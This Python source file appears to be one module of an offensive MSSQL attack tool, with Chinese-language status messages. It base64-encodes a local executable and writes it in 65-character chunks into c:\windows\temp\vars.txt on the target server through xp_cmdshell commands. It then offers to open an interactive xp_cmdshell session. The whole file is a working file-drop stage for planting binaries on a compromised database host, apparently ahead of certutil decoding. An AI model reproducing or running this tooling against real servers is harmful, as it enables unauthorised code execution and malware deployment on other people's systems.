# -*- coding: utf-8 -*
#!/usr/bin/python3

import config
import re
import base64
import time
import mssql_exec

class mssql_certutil:
    def __init__(self,exe_path,coon):
        self.exe_path = exe_path
        self.coon = coon

    def cut_text(self,text, lenth):
        textArr = re.findall('.{' + str(lenth) + '}', text)
        textArr.append(text[(len(textArr) * lenth):])
        return textArr

    def put_base64(self):
        isXpCmdShell = config.get_systeminfo(conn=self.coon).get_xpcmdshell()
        if isXpCmdShell:
            print("[+]文件写入中请稍后")
            with open(self.exe_path, 'rb') as exe:
                code = exe.read()
                bs = base64.b64encode(code)
                utf8_text = bs.decode('utf-8')
                text = self.cut_text(utf8_text, 65)
                for i in text:
                    with open(r"C:\Users\cloud\Desktop\python\base64_win\base64\base64.txt",'w') as txt:
                        txt.write(i)
                    payload =r"""exec master..xp_cmdshell '>>c:\windows\temp\vars.txt set /p="{}" <nul';""".format(i)
                    print(payload)
                    config.mssql_exec(coon=self.coon,payload=payload).sql_exec()
            xuanze = input("[+]写入完成，是否开始使用xp_cmdshell对该文件进行操作(Y/N):")
            if xuanze.upper() == 'Y':
                mssql_exec.shell(self.coon)
            else:
                quit()
        else:
            print("[-]error 当前xp_cmdshell未开启，无法写入文件。")
            quit()



